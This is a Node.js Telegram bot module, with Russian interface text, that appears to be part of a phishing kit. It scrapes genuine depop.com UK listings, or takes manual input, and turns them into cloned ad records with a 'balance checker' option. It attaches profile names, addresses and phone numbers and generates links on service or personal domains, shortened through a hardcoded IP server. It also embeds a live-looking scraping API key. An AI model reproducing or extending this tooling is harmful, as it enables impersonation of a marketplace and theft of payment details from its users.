const WizardScene = require("telegraf/scenes/wizard");
const { Request, Ad, Service, Profiles, MyDomains } = require("../../database");
const locale = require("../../locale");
const escapeHTML = require("escape-html");
const { Markup } = require("telegraf");
const log = require("../../helpers/log");
const cheerio = require("cheerio");
const { default: axios } = require("axios");
const rand = require("../../helpers/rand");
const myAd = require("../../commands/myAd");
const downloadImage = require("../../helpers/downloadImage");

const depop_uk_domains = ["www.depop.com", "depop.com"];

const scene = new WizardScene(
  "create_link_depop_uk",
  async (ctx) => {
    try {
      const service = await Service.findOne({
        where: {
          code: "depop_uk",
        },
      });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
        return ctx.scene.leave();
      }
      ctx.wizard.state.code = ctx.match[1];
      log(ctx, "перешёл к созданию ссылки depop.com");
      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      await ctx.scene.reply("Выбери способ генерации ссылки:", {
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.callbackButton("Ручной", "default"),
            Markup.callbackButton("Парсер", "parser"),
          ],
          [Markup.callbackButton("Отменить", "cancel")],
        ]),
      });
      ctx.scene.state.data = {};
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
            // Проверяем, что пользователь нажал на кнопку, а не написал текст
      if (!ctx.callbackQuery) {
        await ctx.scene
          .reply("❌ Пожалуйста, выбери способ генерации ссылки:", {
            reply_markup: Markup.inlineKeyboard([
              [
                Markup.callbackButton("Ручной", "default"),
                Markup.callbackButton("Парсер", "parser"),
              ],
              [Markup.callbackButton("Отменить", "cancel")],
            ]),
          })
          .catch(() => {});
        return; // остаёмся на этом шаге
      }
      ctx.wizard.state.typeCreate = ctx.callbackQuery.data;

      if (ctx.callbackQuery.data == "parser") {
        await ctx.scene.reply("Отправьте ссылку на объявление depop.com", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        });
      } else {
        await ctx.scene
          .reply("Введите название объявления", {
            reply_markup: Markup.inlineKeyboard([
              [Markup.callbackButton("Отменить", "cancel")],
            ]),
          })
          .catch((err) => err);
      }
      ctx.scene.state.data = {};
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (ctx.wizard.state.typeCreate == "parser") {
        if (!ctx.message?.text) return ctx.wizard.prevStep();
        var url;
        try {
          url = new URL(ctx.message.text);
        } catch (err) {
          await ctx
            .replyOrEdit("❌ Введите валидную ссылку")
            .catch((err) => err);
          return ctx.wizard.prevStep();
        }
        if (!depop_uk_domains.includes(url.host)) {
          await ctx
            .replyOrEdit("❌ Введите ссылку на объявление depop.com")
            .catch((err) => err);
          return ctx.wizard.prevStep();
        }
        const apiKey = "ffe683ec3844c016eca03d8e13d13880";
        const targetUrl = url.href; // ссылка на depop.com

        log(ctx, `отправил ссылку для парсинга depop.com (${targetUrl})`);
      await ctx.scene.reply("🔄 Парсим объявление...").catch((err) => err);

let info = {};
try {
  const apiUrl = `https://api.scraperapi.com/?api_key=${apiKey}&url=${encodeURIComponent(targetUrl)}&premium=true`;
  const ad = await axios.get(apiUrl);
  const $ = cheerio.load(ad.data);

  let title = null;
  let price = null;
  let currency = null;
  let photo = null;
  let date1 = null;

  // 🔍 1. Попробовать получить из JSON-LD
  const jsonScript = $('script[type="application/ld+json"][data-testid="meta__jsonLd"]').html();
  if (jsonScript) {
    try {
      const jsonData = JSON.parse(jsonScript);
      title = jsonData.name || null;
      price = jsonData.offers?.price || null;
      currency = jsonData.offers?.priceCurrency || null;
      photo = Array.isArray(jsonData.image) ? jsonData.image[0] : null;
    } catch (e) {
      console.warn("⚠️ Ошибка парсинга JSON-LD:", e.message);
    }
  }

  // 🧱 2. Если что-то не найдено — fallback на старые методы
if (!title) {
  const ogDescription = $('meta[property="og:description"]').attr('content');
  if (ogDescription) {
    const cleanLines = ogDescription
      .split('\n')
      .map(line => line.trim())
      .filter(line => line && !/^ACCEPTING OFFERS$/i.test(line));
    if (cleanLines.length > 0) {
      title = cleanLines[0];
    }
  }
}

if (!title) title = $("h1.styles_title__kWcg1").text().trim();
  if (!price) {
    let priceEl = $('p.styles_price__H8qdh[aria-label="Price"]').first();
    if (priceEl.length === 0) {
      priceEl = $('p.styles_price__H8qdh[aria-label="Discounted price"]').first();
    }
    if (priceEl.length > 0) {
      price = priceEl.text().trim();
    }
  }

  if (!photo) {
    const imgEl = $("img.styles_imageItem__UWJs6").first();
    if (imgEl.length > 0) {
      photo = imgEl.attr("src");
    }
  }

  const timeEl = $("time.styles_text__AMrZL").first();
  if (timeEl.length > 0) {
    date1 = timeEl.text().trim();
  }

  // 💲 Форматирование цены с валютой
  const priceFormatted = price && currency ? `${price} ${currency}` : price;

  info = {
    title,
    price: priceFormatted,
    photo,
    adLink: targetUrl,
    date1,
  };
  console.log(info)
} catch (err) {
  const errorMsg = `❌ Ошибка при парсинге объявления:\n<code>${
    err.response?.data ? err.response.data.slice(0, 1000) : err.message
  }</code>`;
  await ctx.scene.reply(errorMsg, { parse_mode: "HTML" }).catch(() => {});
  log(ctx, `ошибка при парсинге depop.com (${targetUrl}): ${err.stack || err.message}`);
  return ctx.scene.leave();
}

log(ctx, `спарсил объявление depop.com (${targetUrl})`);
ctx.scene.state.data = info;


        const profiles = await Profiles.findAll({
          where: { userId: ctx.from.id },
        });

        var buttons = profiles.map((v) => [
          Markup.callbackButton(v.title, v.id),
        ]);

        await ctx.scene.reply(`Выберите профиль`, {
          reply_markup: Markup.inlineKeyboard([
            ...buttons,
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        });
      } else {
        ctx.scene.state.data.title = escapeHTML(ctx.message.text);

        const service = await Service.findOne({
          where: {
            code: ctx.wizard.state.code,
          },
        });
        await ctx.scene
          .reply(
            `Введите цену объявления (только число, в ${service.currencyCode})`,
            {
              reply_markup: Markup.inlineKeyboard([
                [Markup.callbackButton("Отменить", "cancel")],
              ]),
            }
          )
          .catch((err) => err);
      }
      return ctx.wizard.next();
    } catch (err) {
      console.log(err);
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (ctx.wizard.state.typeCreate == "parser") {
        const profiles = await Profiles.findOne({
          where: { id: ctx.callbackQuery.data },
        });

        ctx.scene.state.data.address = profiles.address;
        ctx.scene.state.data.name = profiles.name;
        ctx.scene.state.data.phone = profiles.phone;

        await ctx.scene
          .reply("Чекер баланса", {
            reply_markup: Markup.inlineKeyboard([
              [
                Markup.callbackButton("Включить", "true"),
                Markup.callbackButton("Выключить", "false"),
              ],
              [Markup.callbackButton("Отменить", "cancel")],
            ]),
          })
          .catch((err) => err);
      } else {
        var amount = parseFloat(ctx.message?.text);
        if (isNaN(amount)) return ctx.wizard.prevStep();
        if (amount % 1 == 0) amount = amount.toFixed(0);
        else amount = amount.toFixed(2);

        amount = "£" + amount;

        ctx.scene.state.data.price = amount;

        const profiles = await Profiles.findAll({
          where: { userId: ctx.from.id },
        });

        var buttons = profiles.map((v) => [
          Markup.callbackButton(v.title, v.id),
        ]);

        await ctx.scene.reply(`Выберите профиль`, {
          reply_markup: Markup.inlineKeyboard([
            ...buttons,
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        });
      }
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (ctx.wizard.state.typeCreate == "parser") {
        if (!["true", "false"].includes(ctx.callbackQuery?.data))
          return ctx.wizard.prevStep();
        ctx.scene.state.data.balanceChecker = ctx.callbackQuery.data == "true";

        const service = await Service.findOne({
          where: {
            code: "depop_uk",
          },
        });
        if (!service) {
          await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
          return ctx.scene.leave();
        }
        const ad = await Ad.create({
          id: parseInt(rand(999999, 99999999) + new Date().getTime() / 10000),
          userId: ctx.from.id,
          ...ctx.scene.state.data,
          serviceCode: "depop_uk",
        });

        log(
          ctx,
          `создал объявление ${service.title} <code>(ID: ${ad.id})</code>`
        );
        const domains = await MyDomains.findOne({
          where: { userId: ctx.from.id },
        });

        let reductionUrl;

        try {
          const reduction = await axios.post(
            "http://185.208.158.144/api/create",
            {
              target: `https://${service.domain}/${ad.id}`,
              domain: service.shortlink || ctx.state.bot.shortlink,
            },
            { timeout: 2000 }
          );

          reductionUrl = reduction.data.url;
        } catch (error) {
          console.error(
            "Ошибка при создании сокращенной ссылки:",
            error.message
          );

          if (error.code === "ECONNABORTED") {
            console.warn("Запрос превысил допустимый тайм-аут.");
          } else if (
            error.code === "ECONNREFUSED" ||
            error.code === "ENOTFOUND"
          ) {
            console.warn("Сервер сокращений недоступен.");
          } else {
            console.warn("Произошла непредвиденная ошибка:", error.message);
          }

          reductionUrl = null; // корректный fallback
        }

        const personalDomainLink = domains
          ? `https://${domains.domain}/${ad.id}`
          : null;

        await ad.update({
          myDomainLink: personalDomainLink,
          shortLink: reductionUrl, // используем переменную
        });

        log(
          ctx,
          `создал объявление ${service.title} <code>(ID: ${ad.id})</code>`
        );

        // Собираем сообщение
        try {
          await myAd(ctx, ad.id);
        } catch (err) {
          await ctx
            .replyOrEdit("❌ Ошибка при отображении объявления.")
            .catch(() => {});
        }
        ctx.updateType = "message";

        return ctx.scene.leave();
      } else {
        const profiles = await Profiles.findOne({
          where: { id: ctx.callbackQuery.data },
        });

        ctx.scene.state.data.address = profiles.address;
        ctx.scene.state.data.name = profiles.name;
        ctx.scene.state.data.phone = profiles.phone;

        await ctx.scene
          .reply("Отправьте изображение в сжатом формате", {
            reply_markup: Markup.inlineKeyboard([
              [Markup.callbackButton("Пропустить", "skip")],
              [Markup.callbackButton("Отменить", "cancel")],
            ]),
          })
          .catch((err) => err);
        return ctx.wizard.next();
      }
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
    }
    return ctx.scene.leave();
  },
  async (ctx) => {
    try {
      if (ctx.message?.photo?.length < 1 && ctx.callbackQuery?.data !== "skip")
        return ctx.reply("Ошибка");
      if (!ctx.callbackQuery) {
        const photo_link = await ctx.telegram.getFileLink(
          ctx.message.photo[1].file_id
        );
        ctx.wizard.state.data.photo = await downloadImage(photo_link);
      } else {
        ctx.wizard.state.data.photo = null;
      }

      await ctx.scene
        .reply("Чекер баланса", {
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.callbackButton("Включить", "true"),
              Markup.callbackButton("Выключить", "false"),
            ],
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!["true", "false"].includes(ctx.callbackQuery?.data))
        return ctx.wizard.prevStep();
      ctx.scene.state.data.balanceChecker = ctx.callbackQuery.data == "true";

      const service = await Service.findOne({
        where: {
          code: ctx.wizard.state.code,
        },
      });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
        return ctx.scene.leave();
      }

      const ad = await Ad.create({
        id: parseInt(rand(999999, 99999999) + new Date().getTime() / 10000),
        userId: ctx.from.id,
        balanceChecker: ctx.scene.state.data.balanceChecker,
        photo: ctx.wizard.state.data.photo,
        name: ctx.scene.state.data.name,
        address: ctx.scene.state.data.address,
        price: ctx.scene.state.data.price,
        title: ctx.scene.state.data.title,
        serviceCode: ctx.wizard.state.code,
      });

      const domains = await MyDomains.findOne({
        where: { userId: ctx.from.id },
      });

      let reductionUrl;

      try {
        const reduction = await axios.post(
          "http://185.208.158.144/api/create",
          {
            target: `https://${service.domain}/${ad.id}`,
            domain: service.shortlink || ctx.state.bot.shortlink,
          },
          { timeout: 2000 }
        );

        reductionUrl = reduction.data.url;
      } catch (error) {
        console.error("Ошибка при создании сокращенной ссылки:", error.message);

        if (error.code === "ECONNABORTED") {
          console.warn("Запрос превысил допустимый тайм-аут.");
        } else if (
          error.code === "ECONNREFUSED" ||
          error.code === "ENOTFOUND"
        ) {
          console.warn("Сервер сокращений недоступен.");
        } else {
          console.warn("Произошла непредвиденная ошибка:", error.message);
        }

        reductionUrl = null; // корректный fallback
      }

      const personalDomainLink = domains
        ? `https://${domains.domain}/${ad.id}`
        : null;

      await ad.update({
        myDomainLink: personalDomainLink,
        shortLink: reductionUrl, // используем переменную
      });

      log(
        ctx,
        `создал объявление ${service.title} <code>(ID: ${ad.id})</code>`
      );

      // Собираем сообщение
      try {
        await myAd(ctx, ad.id);
      } catch (err) {
        await ctx
          .replyOrEdit("❌ Ошибка при отображении объявления.")
          .catch(() => {});
      }
      ctx.updateType = "message";
      return ctx.scene.leave();
    } catch (err) {
      console.log(err);
    }
  }
);

module.exports = scene;
